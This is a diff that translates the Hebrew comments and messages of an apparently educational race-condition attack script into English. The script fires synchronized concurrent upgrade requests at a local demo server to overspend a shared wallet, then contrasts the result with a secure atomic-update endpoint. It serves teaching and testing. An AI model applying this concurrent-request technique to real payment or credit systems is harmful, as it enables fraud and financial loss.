@@ -1,17 +1,14 @@
 #!/usr/bin/env python3
 """
-attack_tool.py - כלי התקיפה
-============================
-סקריפט שמדגים את מתקפת Race Condition.
-שולח בקשות מקביליות לנקודת הקצה הפגיעה.
-
-Attack tool demonstrating the Race Condition exploit.
-Sends concurrent requests to the vulnerable endpoint.
+attack_tool.py - Attack Tool
+=============================
+Script demonstrating Race Condition exploit.
+Sends concurrent requests to vulnerable endpoint.
 
 Usage:
-    python attack_tool.py           # מתקפה על נקודת קצה פגיעה
-    python attack_tool.py --secure  # בדיקה מול נקודת קצה מאובטחת
-    python attack_tool.py --reset   # איפוס המערכת
+    python attack_tool.py           # Attack vulnerable endpoint
+    python attack_tool.py --secure  # Test against secure endpoint
+    python attack_tool.py --reset   # Reset system only
 """
 
 import requests
@@ -20,11 +17,11 @@ import time
 import argparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# הגדרות
+# Configuration
 BASE_URL = "http://localhost:5000"
-NUM_REQUESTS = 5  # מספר הבקשות המקביליות (כמספר המשתמשים)
+NUM_REQUESTS = 5  # Number of concurrent requests (one per user)
 
-# צבעים לטרמינל
+# Terminal colors
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -38,7 +35,7 @@ class Colors:
 
 
 def print_banner():
-    """הדפסת באנר פתיחה"""
+    """Display opening banner"""
     banner = f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
 ║                                                                   ║
@@ -52,40 +49,40 @@ def print_banner():
 
 
 def print_section(title):
-    """הדפסת כותרת סקשן"""
+    """Display section header"""
     print(f"\n{Colors.CYAN}{'═' * 60}{Colors.END}")
     print(f"{Colors.BOLD}{Colors.CYAN}  {title}{Colors.END}")
     print(f"{Colors.CYAN}{'═' * 60}{Colors.END}\n")
 
 
 def get_stats():
-    """קבלת סטטיסטיקות מהשרת"""
+    """Fetch statistics from server"""
     try:
         response = requests.get(f"{BASE_URL}/api/stats")
         return response.json()
     except requests.exceptions.ConnectionError:
-        print(f"{Colors.RED}❌ שגיאה: לא ניתן להתחבר לשרת!{Colors.END}")
-        print(f"{Colors.YELLOW}   וודא שהשרת רץ: python app.py{Colors.END}")
+        print(f"{Colors.RED}❌ Error: Cannot connect to server!{Colors.END}")
+        print(f"{Colors.YELLOW}   Ensure server is running: python app.py{Colors.END}")
         return None
 
 
-def print_stats(stats, title="מצב המערכת"):
-    """הדפסת סטטיסטיקות"""
+def print_stats(stats, title="System Status"):
+    """Display platform statistics"""
     if not stats:
         return
     
     print_section(title)
     
-    # יתרה
+    # Wallet balance
     balance = stats['wallet']['balance']
     balance_color = Colors.RED if balance < 0 else (Colors.YELLOW if balance < 100 else Colors.GREEN)
-    print(f"  💰 יתרת ארנק: {balance_color}${balance:.2f}{Colors.END}")
+    print(f"  💰 Wallet balance: {balance_color}${balance:.2f}{Colors.END}")
     
-    # משתמשים
-    print(f"  👥 משתמשים: {stats['stats']['free']} Free | {stats['stats']['premium']} Premium")
+    # User count
+    print(f"  👥 Users: {stats['stats']['free']} Free | {stats['stats']['premium']} Premium")
     
-    # רשימת משתמשים
-    print(f"\n  {Colors.BOLD}רשימת משתמשים:{Colors.END}")
+    # User list
+    print(f"\n  {Colors.BOLD}User List:{Colors.END}")
     for user in stats['users']:
         status = f"{Colors.YELLOW}👑 Premium{Colors.END}" if user['is_premium'] else f"{Colors.BLUE}Free{Colors.END}"
         print(f"    • {user['name']} (ID: {user['id']}) - {status}")
@@ -93,14 +90,14 @@ def print_stats(stats, title="מצב המערכת"):
 
 def send_upgrade_request(user_id, secure=False):
     """
-    שליחת בקשת שדרוג לשרת.
+    Send upgrade request to server.
     
     Args:
-        user_id: מזהה המשתמש לשדרוג
-        secure: האם להשתמש בנקודת הקצה המאובטחת
+        user_id: User ID to upgrade
+        secure: Use secure endpoint?
     
     Returns:
-        dict עם תוצאת הבקשה
+        dict with request result
     """
     endpoint = "/api/upgrade/secure" if secure else "/api/upgrade"
     url = f"{BASE_URL}{endpoint}"
@@ -125,67 +122,67 @@ def send_upgrade_request(user_id, secure=False):
 
 
 def reset_system():
-    """איפוס המערכת"""
-    print_section("🔄 מאפס את המערכת...")
+    """Reset system to initial state"""
+    print_section("🔄 Resetting system...")
     try:
         response = requests.post(f"{BASE_URL}/api/reset")
         if response.json().get('success'):
-            print(f"  {Colors.GREEN}✅ המערכת אופסה בהצלחה!{Colors.END}")
+            print(f"  {Colors.GREEN}✅ System reset successfully!{Colors.END}")
             return True
     except Exception as e:
-        print(f"  {Colors.RED}❌ שגיאה באיפוס: {e}{Colors.END}")
+        print(f"  {Colors.RED}❌ Reset error: {e}{Colors.END}")
     return False
 
 
 def launch_attack(secure=False):
     """
-    הרצת המתקפה!
+    Execute the attack!
     
-    שולחת NUM_REQUESTS בקשות במקביל לשרת.
-    כל הבקשות נשלחות באותו רגע בדיוק.
+    Sends NUM_REQUESTS requests concurrently to server.
+    All requests are sent at the exact same moment.
     
     Args:
-        secure: האם לתקוף את נקודת הקצה המאובטחת
+        secure: Attack the secure endpoint?
     """
-    endpoint_type = "מאובטחת 🟢" if secure else "פגיעה 🔴"
-    print_section(f"⚔️ מתחיל מתקפה על נקודת קצה {endpoint_type}")
+    endpoint_type = "secure 🟢" if secure else "vulnerable 🔴"
+    print_section(f"⚡ Starting attack on {endpoint_type} endpoint")
     
-    print(f"  📤 שולח {NUM_REQUESTS} בקשות במקביל...")
-    print(f"  ⏱️  כל הבקשות יישלחו באותו רגע בדיוק\n")
+    print(f"  📤 Sending {NUM_REQUESTS} concurrent requests...")
+    print(f"  ⏱️  All requests sent simultaneously\n")
     
-    # מנגנון סנכרון - כל ה-threads ימתינו לאות התחלה
+    # Synchronization barrier - all threads wait for signal to start
     barrier = threading.Barrier(NUM_REQUESTS)
     results = []
     
     def attack_worker(user_id):
-        """Worker function לכל thread"""
-        # ממתין שכל ה-threads יהיו מוכנים
+        """Worker function for each thread"""
+        # Wait for all threads to be ready
         barrier.wait()
-        # שולח את הבקשה
+        # Send the request
         return send_upgrade_request(user_id, secure)
     
-    # שימוש ב-ThreadPoolExecutor לשליחה מקבילית
+    # Use ThreadPoolExecutor for concurrent sending
     start_time = time.time()
     
     with ThreadPoolExecutor(max_workers=NUM_REQUESTS) as executor:
-        # שולח את כל הבקשות
+        # Send all requests
         futures = [executor.submit(attack_worker, i+1) for i in range(NUM_REQUESTS)]
         
-        # אוסף תוצאות
+        # Collect results
         for future in as_completed(futures):
             results.append(future.result())
     
     elapsed_time = time.time() - start_time
     
-    # הדפסת תוצאות
-    print_section("📊 תוצאות המתקפה")
+    # Display results
+    print_section("📊 Attack Results")
     
     success_count = 0
     for result in sorted(results, key=lambda x: x['user_id']):
         user_id = result['user_id']
         
         if 'error' in result:
-            print(f"  ❌ משתמש {user_id}: שגיאה - {result['error']}")
+            print(f"  ❌ User {user_id}: Error - {result['error']}")
         else:
             response = result['response']
             if response.get('success'):
@@ -193,94 +190,94 @@ def launch_attack(secure=False):
                 req_id = response.get('request_id', 'N/A')
                 balance_before = response.get('balance_before', 'N/A')
                 balance_after = response.get('balance_after', 'N/A')
-                print(f"  {Colors.GREEN}✅ משתמש {user_id}: שודרג!{Colors.END}")
-                print(f"     [{req_id}] יתרה: ${balance_before} → ${balance_after}")
+                print(f"  {Colors.GREEN}✅ User {user_id}: Upgraded!{Colors.END}")
+                print(f"     [{req_id}] Balance: ${balance_before} → ${balance_after}")
             else:
                 error = response.get('error', 'Unknown error')
-                print(f"  {Colors.RED}⛔ משתמש {user_id}: נדחה - {error}{Colors.END}")
+                print(f"  {Colors.RED}⊘ User {user_id}: Rejected - {error}{Colors.END}")
     
-    # סיכום
-    print(f"\n  {Colors.BOLD}סיכום:{Colors.END}")
-    print(f"  • זמן ביצוע: {elapsed_time:.3f} שניות")
-    print(f"  • בקשות שהצליחו: {success_count}/{NUM_REQUESTS}")
+    # Summary
+    print(f"\n  {Colors.BOLD}Summary:{Colors.END}")
+    print(f"  • Execution time: {elapsed_time:.3f}s")
+    print(f"  • Successful requests: {success_count}/{NUM_REQUESTS}")
     
     if not secure and success_count > 1:
-        print(f"\n  {Colors.RED}{Colors.BOLD}🚨 המתקפה הצליחה! 🚨{Colors.END}")
-        print(f"  {Colors.RED}   {success_count} משתמשים שודרגו עם תקציב של משתמש אחד!{Colors.END}")
+        print(f"\n  {Colors.RED}{Colors.BOLD}🚨 ATTACK SUCCEEDED! 🚨{Colors.END}")
+        print(f"  {Colors.RED}   {success_count} users upgraded with single user budget!{Colors.END}")
     elif secure and success_count <= 1:
-        print(f"\n  {Colors.GREEN}{Colors.BOLD}🛡️ ההגנה עבדה! 🛡️{Colors.END}")
-        print(f"  {Colors.GREEN}   רק משתמש אחד שודרג (כצפוי){Colors.END}")
+        print(f"\n  {Colors.GREEN}{Colors.BOLD}🛡️ DEFENSE WORKED! 🛡️{Colors.END}")
+        print(f"  {Colors.GREEN}   Only one user upgraded (as expected){Colors.END}")
 
 
 def main():
-    """פונקציה ראשית"""
+    """Main function"""
     parser = argparse.ArgumentParser(description='Race Condition Attack Tool')
     parser.add_argument('--secure', action='store_true', 
-                       help='תקיפה על נקודת הקצה המאובטחת')
+                       help='Attack the secure endpoint')
     parser.add_argument('--reset', action='store_true',
-                       help='איפוס המערכת בלבד')
+                       help='Reset system only')
     args = parser.parse_args()
     
     print_banner()
     
-    # בדיקת חיבור לשרת
+    # Check server connection
     stats = get_stats()
     if not stats:
         return
     
-    # אם רק איפוס
+    # If reset only requested
     if args.reset:
         reset_system()
         stats = get_stats()
-        print_stats(stats, "מצב לאחר איפוס")
+        print_stats(stats, "Status After Reset")
         return
     
-    # הצגת מצב לפני
-    print_stats(stats, "📊 מצב לפני המתקפה")
+    # Display status before
+    print_stats(stats, "📊 Status Before Attack")
     
-    # בדיקה אם צריך לאפס
+    # Check if system needs reset
     if stats['stats']['premium'] > 0 or stats['wallet']['balance'] != 100:
-        print(f"\n{Colors.YELLOW}⚠️  המערכת לא במצב התחלתי. מאפס...{Colors.END}")
+        print(f"\n{Colors.YELLOW}⚠️  System not in initial state. Resetting...{Colors.END}")
         reset_system()
         time.sleep(0.5)
         stats = get_stats()
-        print_stats(stats, "📊 מצב לאחר איפוס")
+        print_stats(stats, "📊 Status After Reset")
     
-    # הרצת המתקפה (אוטומטית)
-    print(f"\n{Colors.BOLD}🚀 מתחיל מתקפה...{Colors.END}")
+    # Run attack (automatically)
+    print(f"\n{Colors.BOLD}🚀 Starting attack...{Colors.END}")
     time.sleep(1)
     launch_attack(secure=args.secure)
     
-    # הצגת מצב אחרי
+    # Display status after
     time.sleep(0.5)
     stats = get_stats()
-    print_stats(stats, "📊 מצב לאחר המתקפה")
+    print_stats(stats, "📊 Status After Attack")
     
-    # ניתוח סופי
-    print_section("📝 ניתוח")
+    # Final analysis
+    print_section("📝 Analysis")
     
     balance = stats['wallet']['balance']
     premium_count = stats['stats']['premium']
     
     if not args.secure:
         if balance < 0:
-            print(f"  {Colors.RED}🔴 חולשה הודגמה בהצלחה!{Colors.END}")
-            print(f"  • היתרה ירדה ל-${balance} (שלילי!)")
-            print(f"  • {premium_count} משתמשים שודרגו במקום 1")
-            print(f"  • הפסד כספי: ${abs(balance)}")
-            print(f"\n  {Colors.YELLOW}💡 הסיבה:{Colors.END}")
-            print(f"     הבדיקה (Check) והעדכון (Act) לא היו אטומיים.")
-            print(f"     כל הבקשות קראו את אותה יתרה ($100) לפני העדכון.")
+            print(f"  {Colors.RED}🔴 Vulnerability demonstrated successfully!{Colors.END}")
+            print(f"  • Balance dropped to ${balance} (negative!)")
+            print(f"  • {premium_count} users upgraded instead of 1")
+            print(f"  • Financial loss: ${abs(balance)}")
+            print(f"\n  {Colors.YELLOW}💡 Reason:{Colors.END}")
+            print(f"     Check and Act were not atomic.")
+            print(f"     All requests read same balance ($100) before update.")
         else:
-            print(f"  המתקפה לא הצליחה במלואה (ייתכן שהשרת איטי)")
+            print(f"  Attack did not fully succeed (server may be slow)")
     else:
         if balance >= 0 and premium_count <= 1:
-            print(f"  {Colors.GREEN}🟢 ההגנה עבדה!{Colors.END}")
-            print(f"  • היתרה: ${balance} (לא שלילית)")
-            print(f"  • רק {premium_count} משתמש שודרג")
-            print(f"\n  {Colors.YELLOW}💡 למה זה עבד:{Colors.END}")
-            print(f"     העדכון האטומי (UPDATE ... WHERE balance >= cost)")
-            print(f"     מבטיח שהבדיקה והעדכון מתבצעים כפעולה אחת.")
+            print(f"  {Colors.GREEN}🟢 Defense worked!{Colors.END}")
+            print(f"  • Balance: ${balance} (not negative)")
+            print(f"  • Only {premium_count} user upgraded")
+            print(f"\n  {Colors.YELLOW}💡 Why it worked:{Colors.END}")
+            print(f"     Atomic update (UPDATE ... WHERE balance >= cost)")
+            print(f"     Check and Act executed as single operation.")
 
 
 if __name__ == "__main__":
